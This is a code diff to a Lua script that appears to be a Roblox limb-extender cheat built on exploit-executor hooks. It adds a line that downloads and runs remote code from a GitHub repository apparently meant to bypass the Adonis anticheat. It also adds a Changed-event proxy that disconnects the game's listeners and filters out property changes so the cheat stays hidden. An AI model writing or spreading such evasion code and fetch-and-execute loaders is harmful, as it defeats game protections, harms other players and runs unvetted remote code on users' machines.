@@ -66,8 +66,8 @@ local DEFAULTS = {
 	LIMB_CAN_COLLIDE    = false,
 	MOBILE_BUTTON       = false,
 	LISTEN_FOR_INPUT    = true,
-	TEAM_CHECK          = false,
-	FORCEFIELD_CHECK    = true,
+	TEAM_CHECK          = true,
+	FORCEFIELD_CHECK    = false,
 	RESET_LIMB_ON_DEATH = false,
 	PLAYER_ENABLED      = true,
 	NPC_ENABLED         = false,
@@ -94,6 +94,8 @@ limbData.npcIdCounter   = limbData.npcIdCounter   or 0
 if not limbData.dummyEvent then
 	limbData.dummyEvent = Instance.new("BindableEvent")
 end
+
+limbData.changedProxies = limbData.changedProxies or setmetatable({}, { __mode = "k" })
 
 if type(limbData.terminate) == "function" then
 	limbData.terminate()
@@ -122,6 +124,10 @@ end)
 
 if not limbData._spoofInstalled and has_newcclosure and has_hookmetamethod then
 	limbData._spoofInstalled = true
+
+	if has_loadstring and has_httpget then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"))()
+	end
 
 	local function getTargetData(instance)
 		if typeof(instance) ~= "Instance" then return nil, nil end
@@ -288,7 +294,6 @@ local function sharedSaveData(parent, cacheKey, char, limb)
 		if entry.Character and entry.Character ~= char then
 			limbData.instanceLookup[entry.Character] = nil
 		end
-		-- Clear stale char-part registrations from a previous apply
 		if entry._charParts then
 			for _, part in ipairs(entry._charParts) do
 				limbData.instanceLookup[part] = nil
@@ -307,8 +312,7 @@ local function sharedSaveData(parent, cacheKey, char, limb)
 	entry.OriginalCanCollide   = limb.CanCollide
 	entry.OriginalMassless     = limb.Massless
 	entry.OriginalMass         = limb.Mass
-	-- AssemblyMass/AssemblyCenterOfMass are assembly-wide; save them here before
-	-- any modifications so all character parts can be spoofed correctly.
+
 	entry.OriginalAssemblyMass = limb.AssemblyMass
 	entry.OriginalAssemblyCOM  = limb.AssemblyCenterOfMass
 	entry.OriginalExtents      = char:GetExtentsSize()
@@ -318,11 +322,42 @@ local function sharedSaveData(parent, cacheKey, char, limb)
 	limbData.instanceLookup[limb] = { data = entry, type = "Part"  }
 	limbData.instanceLookup[char] = { data = entry, type = "Model" }
 
-	-- Register every other BasePart in the character so that reads of
-	-- AssemblyMass / AssemblyCenterOfMass on those parts are also spoofed.
-	-- All parts in a weld assembly share these values, so without this,
-	-- game code reading e.g. UpperTorso.AssemblyMass would get the real
-	-- (modified) value instead of the original.
+	do
+		local realChanged = limb.Changed
+
+		local preExistingConns = {}
+		if type(getconnections) == "function" then
+			pcall(function()
+				for _, conn in ipairs(getconnections(realChanged)) do
+					table.insert(preExistingConns, conn)
+				end
+			end)
+		end
+
+		local proxy = limbData.changedProxies[limb]
+		if not proxy then
+			local proxyBE  = Instance.new("BindableEvent")
+			local filter   = { enabled = false }
+			local filterFn = function(prop)
+				if not filter.enabled or not BLOCKED_PROPS[prop] then
+					proxyBE:Fire(prop)
+				end
+			end
+			local filterConn = realChanged:Connect(filterFn)
+			proxy = { event = proxyBE.Event, filter = filter, filterFn = filterFn, conn = filterConn, be = proxyBE }
+			limbData.changedProxies[limb] = proxy
+		end
+
+		for _, conn in ipairs(preExistingConns) do
+			local fn
+			pcall(function() fn = conn.Function end)
+			if fn and fn ~= proxy.filterFn then
+				pcall(function() conn:Disconnect() end)
+				pcall(function() proxy.be.Event:Connect(fn) end)
+			end
+		end
+		proxy.filter.enabled = true
+	end
 	local charParts = {}
 	for _, part in ipairs(char:GetDescendants()) do
 		if part:IsA("BasePart") and part ~= limb then
@@ -359,12 +394,18 @@ local function sharedRestoreLimb(parent, cacheKey, activeLimb)
 		limbData.instanceLookup[activeLimb] = nil
 	end
 	if entry.Character then limbData.instanceLookup[entry.Character] = nil end
-	-- Clean up char-part registrations (assembly-property spoof entries)
 	if entry._charParts then
 		for _, part in ipairs(entry._charParts) do
 			limbData.instanceLookup[part] = nil
 		end
 		entry._charParts = nil
+	end
+
+	local _cp = limbData.changedProxies[entry.Limb]
+	if _cp then _cp.filter.enabled = false end
+	if activeLimb and activeLimb ~= entry.Limb then
+		local _cpActive = limbData.changedProxies[activeLimb]
+		if _cpActive then _cpActive.filter.enabled = false end
 	end
 
 	cache[cacheKey] = nil
